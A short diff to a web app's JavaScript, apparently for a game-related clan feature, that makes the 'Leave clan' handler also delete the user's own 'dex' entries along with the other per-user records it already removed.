@@ -1425,7 +1713,7 @@ $("kLinkDevice").addEventListener("click",async()=>{
 $("kLeave").addEventListener("click",async()=>{
   if(!confirm("Leave the clan on this device? Your entries will be removed from the board."))return;
   const c=get("clan2",null);
-  try{await db(c,"DELETE",np(c,"board")+"/"+c.me);await db(c,"DELETE",np(c,"custom")+"/"+c.me);if(c.sv>=2){await db(c,"DELETE",np(c,"pokes")+"/"+c.me);await db(c,"DELETE",np(c,"lib")+"/"+c.me)}}catch(e){}
+  try{await db(c,"DELETE",np(c,"board")+"/"+c.me);await db(c,"DELETE",np(c,"custom")+"/"+c.me);if(c.sv>=2){await db(c,"DELETE",np(c,"pokes")+"/"+c.me);await db(c,"DELETE",np(c,"lib")+"/"+c.me);await db(c,"DELETE",np(c,"dex")+"/"+c.me)}}catch(e){}
   tokA={t:"",exp:0};tokC={t:"",exp:0};set("clan2",null);renderClan();
 });
 ["kRange","kMetric","kFilterGen"].forEach(id=>$(id).addEventListener("change",renderClan));
